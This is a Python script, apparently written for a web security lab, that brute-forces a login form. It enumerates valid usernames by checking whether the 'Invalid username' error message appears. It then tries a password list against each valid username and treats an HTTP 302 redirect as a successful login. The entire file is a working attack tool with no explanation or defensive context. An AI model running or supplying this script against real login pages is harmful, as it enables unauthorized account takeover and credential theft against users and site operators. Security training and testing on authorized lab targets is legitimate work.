from dotenv import load_dotenv
import os
import requests

load_dotenv()

with open('usernames.txt', 'r') as file:
    usernames = [line.strip() for line in file.readlines()]

with open('passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file.readlines()]

url = f"{os.getenv("URL")}/login"

def brute_force(url, usernames, passwords):
    print("Checking valid username")

    for username in usernames:
        data = {
            "username":f"{username}",
            "password":"test"
        }

        response = requests.post(url=url, data=data)
        if not "Invalid username" in response.text:
            print(f"Valid username is: {username}, checking password...")
            for password in passwords:
                data = {
                        "username": f"{username}",
                        "password": f"{password}"
                }
                response = requests.post(url=url, data=data, allow_redirects=False)
                if response.status_code == 302:
                    print(f"Redirected to {response.headers['Location']}")
                    return username, password 

if __name__ == "__main__":
    username, password = brute_force(url, usernames, passwords)
    print(f"==Valid credentials are==\nUsername: {username}\nPassword: {password}")
